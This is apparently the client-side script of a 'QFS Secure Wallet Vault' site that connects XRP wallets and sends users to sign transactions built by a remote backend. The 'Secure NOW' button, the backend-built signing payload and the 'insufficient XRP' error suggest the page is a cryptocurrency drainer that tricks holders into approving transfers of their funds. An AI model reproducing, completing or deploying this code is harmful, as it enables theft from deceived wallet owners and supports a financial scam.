// ==============================
// CONFIG
// ==============================
const BACKEND_URL = "https://cultured.pythonanywhere.com";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";

// ==============================
// STATE
// ==============================
let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function updateAllButtonsToSecure() {
  document.querySelectorAll("#mainActionButton").forEach(btn => {
    btn.innerText = "Secure NOW";
    btn.classList.remove("btn-primary");
    btn.classList.add("btn-success");
    btn.onclick = e => {
      e.preventDefault();
      triggerManualApproval();
    };
  });
}

// ==============================
// CONNECTION LOGIC
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");

    // ❌ NO XAMAN SDK HERE ANYMORE
    if (type === "xaman") {
      setStatus("Enter your XRP address to continue");
      return;
    }

    if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) handlePostConnect("walletconnect", address);
    }

  } catch (err) {
    console.error(err);
    setStatus("Connection failed");
  }
}

// Manual address capture (use from input field)
function connectXamanAddress(address) {
  if (!address || !address.startsWith("r")) {
    setStatus("Invalid XRP address");
    return;
  }
  handlePostConnect("xaman", address);
}

function handlePostConnect(type, address) {
  currentWalletType = type;
  currentAddress = address;

  const modal = document.getElementById("walletSelectionModal");
  if (modal) bootstrap.Modal.getOrCreateInstance(modal).hide();

  updateAllButtonsToSecure();
  setStatus(`Connected: ${shortAddr(address)}`);
}

// ==============================
// SECURE TRANSFER (BACKEND → XAMAN)
// ==============================
async function triggerManualApproval() {
  if (!currentAddress) {
    setStatus("Connect wallet first");
    return;
  }

  try {
    setStatus("Preparing secure approval…");

    const res = await fetch(`${BACKEND_URL}/api/xaman/payload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ address: currentAddress })
    });

    if (!res.ok) {
      const err = await res.json();
      setStatus(err.detail || "Wallet has insufficient XRP");
      return;
    }

    const data = await res.json();

    if (!data.signUrl) {
      setStatus("Unable to create approval");
      return;
    }

    // 🔐 ONLY place Xaman opens
    window.location.href = data.signUrl;

  } catch (err) {
    console.error(err);
    setStatus("Approval failed");
  }
}

// ==============================
// WALLETCONNECT
// ==============================
async function initWalletConnect() {
  if (wcClient) return;

  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS",
      description: "Secure Wallet Vault",
      url: window.location.origin
    }
  });

  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

document.addEventListener("DOMContentLoaded", () => {
  const knownAddress = "rXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
  connectXamanAddress(knownAddress);
});


async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"]
      }
    }
  });

  if (uri) wcModal.openModal({ uri });

  const session = await approval();
  wcModal.closeModal();

  return session.namespaces.xrpl.accounts[0].split(":")[2];
}
